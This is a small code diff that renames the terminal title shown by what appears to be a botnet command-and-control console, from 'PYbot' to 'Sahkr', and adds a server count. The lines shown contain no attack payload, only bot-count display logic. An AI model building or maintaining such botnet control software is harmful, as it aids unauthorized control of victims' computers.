@@ -85,7 +85,7 @@ def update_title(client, username):
     """ updates the shell title, duh? """
     while 1:
         try:
-            send(client, f'\33]0;PYbot | Bots: {len(bots)} | Connected as: {username}\a', False)
+            send(client, f'\33]0;Sahkr | Bots: {len(bots)} | Servers: {len(bots)} | Connected as: {username}\a', False)
             time.sleep(2)
         except:
             client.close()
